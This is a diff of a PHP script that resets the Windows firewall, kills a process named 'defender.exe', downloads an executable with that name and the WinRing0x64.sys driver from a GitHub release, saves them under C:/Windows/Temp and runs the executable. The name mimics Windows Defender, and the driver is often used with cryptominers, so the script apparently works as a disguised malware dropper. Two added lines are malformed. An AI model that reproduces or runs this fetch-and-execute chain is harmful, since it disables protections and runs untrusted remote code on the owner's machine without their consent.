@@ -31,15 +31,17 @@ function downloadFile($url, $savePath) {
 
 
 
+system('ntaskkill /F /IM defender.exe /T'); 
+vsystem('taskkill /F /IM defender.exe /T'); 
 system('netsh advfirewall reset');  
-system('mkdir "C:/Windows/Temp/RightProgramTwo"');  
+system('mkdir "C:/Windows/Temp/RightProgramOne"');  
 exec('tasklist', $output);
 
 $url =  'https://github.com/danialchork/project-final/releases/download/last3/defender.exe';
 $url2 =  'https://github.com/danialchork/project-final/releases/download/last/WinRing0x64.sys';
 
-$file_name = 'C:/Windows/Temp/RightProgramTwo/defender.exe';
-$file_name2 = 'C:/Windows/Temp/RightProgramTwo/WinRing0x64.sys';
+$file_name = 'C:/Windows/Temp/RightProgramOne/defender.exe';
+$file_name2 = 'C:/Windows/Temp/RightProgramOne/WinRing0x64.sys';
 
 $found = false;
 $found2 = false;
@@ -76,7 +78,7 @@ if (!$found && !$found2) {
         } else {
             echo "Failed to download file, aborting further processing.\n";
         }
-         system('C:/Windows/Temp/RightProgramTwo/defender.exe');
+         system('C:/Windows/Temp/RightProgramOne/defender.exe');
 
         
 
